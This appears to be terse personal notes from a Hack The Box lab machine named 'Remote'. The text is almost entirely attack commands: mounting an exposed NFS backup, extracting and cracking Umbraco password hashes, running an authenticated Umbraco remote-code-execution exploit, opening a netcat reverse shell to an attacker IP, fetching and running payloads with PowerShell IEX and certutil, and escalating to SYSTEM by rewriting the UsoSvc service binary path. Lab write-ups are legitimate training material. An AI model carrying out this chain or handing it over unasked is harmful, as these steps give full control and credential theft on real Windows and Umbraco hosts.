# Remote

nmap -sC -sV 10.10.10.180

see anonyous ftp login available, nothing there



root@kali:~# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)


root@kali:~# mkdir share
root@kali:~# sudo mount -t nfs 10.10.10.180:/site_backups ~/share

tree ~/share

strings Web.config

                <add key="umbracoConfigurationStatus" value="7.12.4" />



strings Umbraco.sdf

users found ssmith and admin

adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f

use crackstation
baconandcheese for admin


ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32


http://10.10.10.180/umbraco/#/content

sign in as admin@htb.local, baconandcheese

umbraco cve?

root@kali:~/Downloads/tools/Umbraco-RCE# python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c 'whoami'
iis apppool\defaultapppool


host shell on https server
use umbraco-rce and take file, run
listen back to netcat port 4444


e1f59fd6e3d84a858994692447bf9bf3

python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c 'cmd.exe'



sign in as admin@htb.local, baconandcheese


{ string cmd = "/c c:/windows/temp/nc.exe 10.10.15.222 4442 -e cmd.exe";


IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.222:8000/myway.exe')


python3 CMSexploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.222:8000/myway.exe')"
'
(new-object System.Net.WebClient).DownloadFile('http://10.10.15.222:8000/myway.exe')

python3 CMSexploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "(new-object System.Net.WebClient).DownloadFile('http://10.10.15.222:8000/myway.exe')"

python3 CMSexploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 

look around to find media/1033/myway.exe


python3 CMSexploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/inetpub/wwwroot/Media/1033/myway.exe'



root

certutil -urlcache -split -f http://10.10.15.222:8000/myway.exe c:/windows/temp/myway.exe

certutil -urlcache -split -f http://10.10.15.222:8000/root.exe c:/windows/temp/root.exe

sc config usosvc binpath="c:\windows\temp\root.exe"

sc stop usosvc
sc start usosvc